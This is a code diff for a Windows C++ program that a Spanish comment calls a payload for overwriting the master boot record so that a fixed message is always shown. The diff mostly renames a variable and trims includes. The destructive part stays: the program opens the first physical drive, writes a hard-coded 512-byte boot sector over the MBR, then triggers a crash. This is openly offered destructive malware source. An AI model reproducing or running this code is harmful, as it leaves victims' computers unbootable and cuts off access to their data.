@@ -1,15 +1,11 @@
-/* Payload para afecar a sitemas MiniOS, sobreescribe el MBR para mostrar siempre un mensaje*/
+/* Payload que sobreescribe el MBR para mostrar siempre un mensaje*/
 
 #include <windows.h>
 #include <winbase.h>
 #include <iostream>
-#include <string>
-#include <sstring>
 #include <cstdlib>
-#include <cstring>
 #include <unistd.h>
 #include <MMsystem.h>
-#include <fstream>
 
 #pragma warning(disable : 4996)
 
@@ -49,12 +45,12 @@ const unsigned char MBR[] = {0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA};
 
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
-    DWORD hopeless;
+    DWORD zx;
     HANDLE MasterBootRecord = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
     if (MasterBootRecord == INVALID_HANDLE_VALUE){
         Exit(1);
     }
-    WriteFile(MasterBootRecord, MBR, 512, &hopeless, NULL);
+    WriteFile(MasterBootRecord, MBR, 512, &zx, NULL);
     BSOD();
     CloseHandle(MasterBootRecord);
 }
